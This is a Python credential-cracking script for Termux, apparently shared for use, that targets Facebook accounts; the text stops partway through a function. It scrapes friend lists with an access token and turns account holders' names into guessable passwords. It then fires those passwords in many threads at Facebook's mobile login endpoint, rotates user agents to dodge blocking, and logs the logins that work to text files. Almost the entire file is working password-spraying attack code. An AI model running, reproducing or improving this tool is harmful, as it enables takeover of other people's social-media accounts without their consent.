#coding=utf-8
#!/usr/bin/python3
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
import requests, re, os, time
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as Psycho
from concurrent.futures import ThreadPoolExecutor as Psycho
from datetime import datetime
from bs4 import BeautifulSoup
from multiprocessing.pool import ThreadPool
import platform,base64
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor
try:
     import os, storage, requests, mechanize, bs4, futures
except ImportError:
    os.system('termux-setup-storage')
    os.system('clear')
    os.system('pip install requests')
    os.system('pip install mechanize')
    os.system('pip install bs4')
    os.system('pip install future')
    os.system('clear')
try:
    import requests
except ImportError:
    print('\n [âœ“] installing requests !...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n [âœ“] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [âœ“] installing bs4 !...\n')
    os.system('pip install bs4')
if not os.path.isfile('.agents.txt'):
    os.system('curl -L https://raw.githubusercontent.com/mrpardesi007/files/main/.agents.txt > .agents.txt')
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
if not os.path.isfile('/sdcard/Download/python_13.1'):
	n = random. randint(11111,99999);x = open('/sdcard/Download/python_13.1', 'a');x.write(str(n));x.close()
with open(".agents.txt") as funk:
    liners = funk.readlines()

ok = []
cp = []
id = []
user = []
num = 0
loop = 0
_silet_koceng_  = requests.Session()
url_mb = "https://mbasic.facebook.com"
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
P = '\x1b[1;97m' # PUTIH
M = '\033[0;91m' # MERAH 
H = '\033[1;92m' # HIJAU 
K = '\033[1;91m' # KUNING 
B = '\033[0;94m' # BIRU 
U = '\033[0;95m' # UNGU 
O = '\033[0;96m' # BIRU MUDA
N = '\033[0m'	# WARNA MATI 
from concurrent.futures import ThreadPoolExecutor as QADIRMahar
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
###
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

def main():
    os.system('clear');print(banner)
    print('\033[1;32m        ┌─────────┐') 
    print("\033[1;92m\t│\033[1;96mMAIN MENU\033[1;92m│")
    print('\033[1;32m┌────────────────────────────────────────────┐') 
    print('\033[1;92m│\033[1;37m[01] \033[1;96mFILE CLONING   \033[1;37m[\033[1;32mCP/OK MIX IDS\033[1;37m] \033[1;31m(\033[1;32mFAST\033[1;31m) \033[1;32m │ ')
    print('\033[1;92m│\033[1;37m[02] \033[1;96mFILE CLONING   \033[1;37m[\033[1;32mONLY OK IDS  \033[1;37m] \033[1;31m(\033[1;32mSLOW\033[1;31m) \033[1;32m │')
    print('\033[1;92m│\033[1;37m[03] \033[1;96mPUBLIC CLONING \033[1;37m[\033[1;32mCP/OK MIX IDS\033[1;37m]\033[1;31m (\033[1;32mFAST\033[1;31m) \033[1;32m │')
    print('\033[1;92m│\033[1;37m[04] \033[1;96mCREATE FILE \033[1;32m                           │')
    print('\033[1;92m│\033[1;37m[05] \033[1;96mSEPARATE IDS\033[1;32m                           │ ')
    print('\033[1;92m│\033[1;37m[06] \033[1;96mCONTACT WITH OWNER \033[1;32m                    │')
    print('\033[1;92m│\033[1;37m[07] \033[1;96mREMOVE TOKEN\033[1;32m                           │')
    print('\033[1;92m│\033[1;37m[00] \033[1;91mEXIT\033[1;32m                                   │ ')
    print('\033[1;32m└────────────────────────────────────────────┘')
    print('')
    psy = input('\033[1;37m[+] \033[1;32mCHOOSE OPTION : ')
    if psy in ('1', '01'):
        __crack__().plerr()
    if psy in ('2', '02'):
        __filecrack3__().plerr()
    if psy in ('3', '03'):
        publiccrack()
    if psy in ('04', '4'):
        create_file()
    if psy in ('5', '05'):
    	os.system('clear');print(banner);sep()
    if psy in ('6', '06'):
    	os.system("xdg-open https://www.facebook.com/ps7c8o.p133h1")
    if psy in ('7', '07'):
        time.sleep(2)
        os.system('clear');print(banner);print(' Removing Token .');time.sleep(1);os.system('clear');print(banner);print(' Removing Token ..');time.sleep(1);os.system('clear');print(banner);print(' Removing Token ...');time.sleep(2);os.system('clear');print(banner);print('\033[1;91mToken Removed\033[0m');time.sleep(3);os.system('rm -rf access_token.txt'); version()
    if psy in ('0', '00'):
        exit('THANKS FOR USING PSYCHO PICCHI TOOL')  
    else:
    	print ('        Invalid Select')
    version()
    
def login():
    os.system('clear');print(banner)
    tok = input('\033[1;37m[+]  \033[1;36mPUTT ACCESS TOKEN\033[1;31m : \033[1;32m')
    if 'EAAB' in tok:
        pass
    else:
        print('  \033[1;37mOnly fb ads access token can be used for scraping data')
        print('  \033[1;37mCheck main menu for creating fb ads access token....o')
        os.sys.exit()
    try:
        u = requests.get('https://graph.facebook.com/me?access_token='+tok).text
        u1 = json.loads(u)
        name = u1['name']
        ts = open('access_token.txt', 'w')
        ts.write(tok)
        ts.close()
        print('\033[1;92m\t Logged in successfully')
        time.sleep(1)
        version()
    except KeyError:
        print('\n\033[1;91m  Invalid token provided, try again  ')
        time.sleep(1)
        login()      
def banner():
	print(banner)
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print('\033[1;96m The Prosess Done Is Completed')
		print('\n\033[1;92mTotal OK : %s \n \033[1;95m Total CP : %s'%(str(len(ok)),str(len(cp))));input(' Press Enter To Go Back ');version()
		#print('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
		print('\n\033[0mYour Ip Is Blocked Or Blacklist Restart Your Mobile ')
		exit()
		
class __crack__:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear");print(banner)
		print('          \033[1;32m[ File CLONING CP/OK IDS MIX ] ')
		print(50*"\033[1;97m_")
		try:
			self.apk = input("\033[1;37m[+] \033[1;36mFILE PATH\033[1;31m : \033[1;32m ")
			print ('')
			self.id = open(self.apk).read().splitlines()
		except:
			print('\n \033[1;37m[!] \033[1;31mFile Not Found In Storage')
			input('\n\033[1;37m[*] \033[1;36mPress Enter To Back');version()
		self.__pler__()
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mPicchi\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Id\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			except: pass
			try:
				psyagents = random.choice(liners)
			except (KeyError, IOError):
				Adiagents  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			ses = requests.Session()
			headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mPSYCHO-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mPICCHI-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('cp.txt','a').write('%s\n' % wrt)
				break
			else:
				continue
		loop += 1
	def __pler__(self):
		os.system("clear")
		print(banner)
		print ("\033[1;37m [1] \033[1;36mMETHOD FAST ")
		print ("\033[1;37m [2] \033[1;36mMETHOD NORMEL ")
		print ("\033[1;37m [3] \033[1;36mMETHOD MEDIUM ")
		print(50*"\033[1;97m_")
		yan = input('\033[1;37m[+] \033[1;36mCHOOSE OPTION \033[1;31m: \033[1;32m')
		if yan == '':
			print('\Choose Error ')
			exit()
		elif yan in ('1', '01'):
			os.system("clear")
			print(banner)
			time.sleep(1)
			print('\033[1;37m[+]\033[1;33m File CLONING CP/OK IDS MIX ')
			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
			print('\033[1;37m[+]\033[1;36m PROCESS HAS BEEN STARTED')
			print(50*"\033[1;97m_")
			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
			print(50*"\033[1;97m_")
			with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
						elif len(xz) == 2:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
						elif len(xz) == 3:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
						elif len(xz) == 4:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
						else:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
						pass
			os.remove(self.apk)
			hasil(ok,cp)
		elif yan in ('2', '02'):
			os.system("clear")
			print(banner)
			time.sleep(1)
			print('\033[1;37m[+]\033[1;33m File CLONING CP/OK IDS MIX ')
			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
			print('\033[1;37m[+]\033[1;36m PROCESS HAS BEEN STARTED')
			print(50*"\033[1;97m_")
			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
			print(50*"\033[1;97m_")
			with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'786']
						elif len(xz) == 2:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'786']
						elif len(xz) == 3:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'786']
						elif len(xz) == 4:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'786']
						else:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'786']
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
						pass
			os.remove(self.apk)
			hasil(ok,cp)
		elif yan in ('3', '03'):
			os.system("clear")
			print(banner)
			time.sleep(1)
			print('\033[1;37m[+]\033[1;33m File CLONING CP/OK IDS MIX ')
			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
			print('\033[1;37m[+]\033[1;36m PROCESS HAS BEEN STARTED')
			print(50*"\033[1;97m_")
			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
			print(50*"\033[1;97m_")
			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"1122"]
						elif len(xz) == 2:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"1122"]
						elif len(xz) == 3:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"1122"]
						elif len(xz) == 4:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"1122"]
						else:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"1122"]
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
						pass
			os.remove(self.apk)
			hasil(ok,cp)
		else:
			print('\nSalah')
			time.sleep(1)
			self.__pler__()
			
class __filecrack3__:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear");print(banner)
		print('          \033[1;32m[ File CLONING ONLY OK IDS ] ')
		print(50*"\033[1;97m_")
		try:
			self.apk = input("\033[1;37m[+] \033[1;36mFILE PATH\033[1;31m : \033[1;32m ")
			print ('')
			self.id = open(self.apk).read().splitlines()
		except:
			print('\n \033[1;37m[!] \033[1;31mFile Not Found In Storage')
			input('\n\033[1;37m[*] \033[1;36mPress Enter To Back');version()
            
     
		self.__pler__()
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mPSYCHO\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			except: pass
			try:
				ua_xiaomi = open('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			ses = requests.Session()
			headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mPSYCHO-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('Psycho_Ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				try:
					token = bayn('token.txt').read()
					cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].print('\r\033[1;91m[PICCHI-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('Picchi_Cp.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					year  = ''
				except:
					pass
				print('\r\033[1;91m[PICCHI-CP] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('Picchi_Cp.txt','a').write('%s\n' % wrt)
				break
			else:
				continue
		loop += 1
	def __pler__(self):
		os.system("clear")
		print(banner)
		print ("\033[1;37m [1] \033[1;36mMETHOD FAST ")
		print ("\033[1;37m [2] \033[1;36mMETHOD NORMEL ")
		print ("\033[1;37m [3] \033[1;36mMETHOD MEDIUM ")
		print(50*"\033[1;97m_")
		yan = input('\033[1;37m[+] \033[1;36mCHOOSE OPTION \033[1;31m: \033[1;32m')
		if yan == '':
			print('\Choose Error ')
			exit()
		elif yan in ('1', '01'):
			os.system("clear")
			print(banner)
			time.sleep(1)
			print('\033[1;37m[+]\033[1;33m FILE CLONING ONLY OK IDS ')
			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
			print('\033[1;37m[+]\033[1;36m PROCESS HAS BEEN STARTED')
			print(50*"\033[1;97m_")
			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
			print(50*"\033[1;97m_")
			with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						fi , la = name.split(' ')
						first = fi.lower()
						last = la.lower()
						if len(xz) == 1:
							pwx = [first+' '+last, first+last, first+'123', first+'12345']
						elif len(xz) == 2:
							pwx = [first+' '+last, first+last, first+'123', first+'12345']
						elif len(xz) == 3:
							pwx = [first+' '+last, first+last, first+'123', first+'12345']
						elif len(xz) == 4:
							pwx = [first+' '+last, first+last, first+'123', first+'12345']
						else:
							pwx = [first+' '+last, first+last, first+'123', first+'12345']
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
						pass
			os.remove(self.apk)
			hasil(ok,cp)
		elif yan in ('2', '02'):
			os.system("clear")
			print(banner)
			time.sleep(1)
			print('\033[1;37m[+]\033[1;33m FILE CLONING ONLY OK IDS ')
			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
			print('\033[1;37m[+]\033[1;36m PROCESS HAS BEEN STARTED')
			print(50*"\033[1;97m_")
			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
			print(50*"\033[1;97m_")
			with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345"]
						elif len(xz) == 2:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345"]
						elif len(xz) == 3:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345"]
						elif len(xz) == 4:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345"]
						else:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345"]
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
						pass
			os.remove(self.apk)
			hasil(ok,cp)
		elif yan in ('3', '03'):
			os.system("clear")
			print(banner)
			time.sleep(1)
			print('\033[1;37m[+]\033[1;33m FILE CLONING ONLY OK IDS ')
			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
			print('\033[1;37m[+]\033[1;36m PROCESS HAS BEEN STARTED')
			print(50*"\033[1;97m_")
			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
			print(50*"\033[1;97m_")
			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345"]
						elif len(xz) == 2:
							pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345"]
						elif len(xz) == 3:
							pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345"]
						elif len(xz) == 4:
							pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345"]
						else:
							pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345"]
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
							pass
			os.remove(self.apk)
			hasil(ok,cp)
		else:
			print('\nSalah')
			time.sleep(1)
			self.__pler__()
			
def publiccrack():
    os.system('clear');print(banner)
    try:
        access_token = open('access_token.txt', 'r').read()
    except:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()
    os.system('clear')
    print(banner)
    os.system('rm -rf .psy1.txt')
    os.system('rm -rf .psy2.txt')
    print(' \033[1;96mLogged user : \033[1;92m  '+uname)
    print(50*"\033[1;97m_")
    print('          \033[1;32m[ PUBLIC CLONING MENU CP/OK MIX ] ')
    print(50*"\033[1;97m_")
    print('\033[1;37m[1] \033[1;36mPUBLIC CLONING')
    print('\033[1;37m[0] \033[1;31mBACK')
    print(50*"\033[1;97m_")
    _Adi__ = input('\033[1;37m[+] \033[1;32mCHOOSE OPTION : ')
    if _Adi__ in ('1', '01'):
        __cracking__().plerr()
    if _Adi__ in ('0', '00'):
    	time.sleep(2);version()
    else:
    	print('        Invalid Select')
    time.sleep(1)
    version() 
    
class __cracking__:
	def __init__(self):
		self.id = []
		if not os.path.exists("access_token.txt"):
			login()
	def plerr(self):
		os.system("clear");print(banner);access_token = open('access_token.txt','r').read();dill=[];os.system("rm -rf .publicout.txt")
		print('          \033[1;32m[ PUBLIC CLONING CP/OK MIX ] ')
		print(50*"\033[1;97m_")
		self.apk = input("\033[1;37m[+]\033[1;96m PUBLIC ID \033[1;91m:  \033[1;92m")
		#self.id = open('.publicout.txt').read().splitlines()
		ppk = ('.publicout' + '.txt').replace(' ', '_')
		ys = open(ppk, 'a')
		rg = requests.get('https://graph.facebook.com/'+self.apk+'/friends?limit=5000&access_token='+access_token).text
		rgq = json.loads(rg)
		idsave=open('.publicout.txt', 'a')
		for inayat in rgq['data']:
			uids = inayat['id']
			dill.append(uids)
			nm = inayat['name']
			first_name = nm.split(' ')[0]
			try:
				last_name = nm.split(' ')[1]
			except:
				last_name = 'Khan'
			idsave.write(uids+'|'+first_name+' '+last_name+'\n')
		self.__pler__()
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mAdi\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			except: pass
			try:
				psyagents = random.choice(liners)
			except (KeyError, IOError):
				psyagents  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			ses = requests.Session()
